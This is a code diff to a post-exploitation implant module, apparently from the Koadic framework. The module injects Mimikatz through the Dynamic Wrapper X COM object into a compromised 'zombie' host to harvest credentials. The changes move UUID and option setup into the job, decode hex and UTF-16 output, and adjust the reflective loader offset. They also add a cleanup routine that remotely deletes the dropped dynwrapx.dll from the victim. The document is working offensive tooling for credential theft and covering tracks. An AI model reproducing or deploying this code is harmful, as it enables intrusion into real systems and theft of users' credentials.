@@ -3,11 +3,21 @@ import core.job
 import core.cred_parser
 import string
 import collections
+import time
+import uuid
 
 class DynWrapXShellcodeJob(core.job.Job):
     def create(self):
         self.fork32Bit = True
         self.errstat = 0
+        self.options.set("DLLUUID", uuid.uuid4().hex)
+        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
+        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
+        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
+        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
+        self.options.set("MIMICMD", self.options.get("MIMICMD").lower())
+        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
 
     def parse_mimikatz(self, data):
         cp = core.cred_parser.CredParse(self)
@@ -15,6 +25,14 @@ class DynWrapXShellcodeJob(core.job.Job):
 
     def report(self, handler, data, sanitize = False):
         data = data.decode('latin-1')
+        import binascii
+        try:
+            data = binascii.unhexlify(data)
+            data = data.decode('utf-16-le')
+        except:
+            pass
+
+        #print(data)
         task = handler.get_header(self.options.get("UUIDHEADER"), False)
 
         if task == self.options.get("DLLUUID"):
@@ -48,8 +66,38 @@ class DynWrapXShellcodeJob(core.job.Job):
 
         handler.reply(200)
 
+    def make_arrDLL(self, path):
+        import struct
+        count = 0
+        ret = ""
+        with open(path, 'rb') as fileobj:
+            for chunk in iter(lambda: fileobj.read(4), ''):
+                if len(chunk) != 4:
+                    break
+                integer_value = struct.unpack('<I', chunk)[0]
+                ret += hex(integer_value).rstrip("L") + ","
+                if count % 20 == 0:
+                    ret += "\r\n"
+
+                count += 1
+        return ret[:-1]
+
     def done(self):
+        self.results = self.mimi_output if self.mimi_output else ""
         self.display()
+        # deleting dynwrapx.dll, i hate this
+        time.sleep(1)
+        plugin = self.shell.plugins['implant/manage/exec_cmd']
+        old_zombie = plugin.options.get("ZOMBIE")
+        old_cmd = plugin.options.get("CMD")
+        old_output = plugin.options.get("OUTPUT")
+        plugin.options.set("ZOMBIE", self.options.get("ZOMBIE"))
+        plugin.options.set("CMD", "del /f "+self.options.get("DIRECTORY")+"\\dynwrapx.dll & echo done")
+        plugin.options.set("OUTPUT", "true")
+        plugin.run()
+        plugin.options.set("ZOMBIE", old_zombie)
+        plugin.options.set("CMD", old_cmd)
+        plugin.options.set("OUTPUT", old_output)
 
     def display(self):
         try:
@@ -62,6 +110,7 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
     NAME = "Shellcode via Dynamic Wrapper X"
     DESCRIPTION = "Executes arbitrary shellcode using the Dynamic Wrapper X COM object"
     AUTHORS = ["zerosum0x0", "Aleph-Naught-" "gentilwiki"]
+    STATE = "implant/inject/mimikatz_dynwrapx"
 
     def load(self):
         self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)
@@ -86,7 +135,10 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
 
         self.options.register("SHIMX86BYTES", "", "calculated bytes for arr_DLL", hidden=True)
 
-        self.options.register("SHIMX86OFFSET", "6217", "Offset to the reflective loader", advanced = True)
+        self.options.register("SHIMX86OFFSET", "6202", "Offset to the reflective loader", advanced = True)
+
+    def job(self):
+        return DynWrapXShellcodeJob
 
     def make_arrDLL(self, path):
         import struct
@@ -106,21 +158,7 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
         return ret[:-1] # strip last comma
 
     def run(self):
-
-        import uuid
-        self.options.set("DLLUUID", uuid.uuid4().hex)
-        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
-        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
-        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
-        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
-
-        self.options.set("MIMICMD", self.options.get("MIMICMD").lower())
-
-
-        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))
-
-
         workloads = {}
-        workloads["js"] = self.loader.load_script("data/implant/inject/mimikatz_dynwrapx.js", self.options)
+        workloads["js"] = "data/implant/inject/mimikatz_dynwrapx.js"
 
-        self.dispatch(workloads, DynWrapXShellcodeJob)
+        self.dispatch(workloads, self.job)
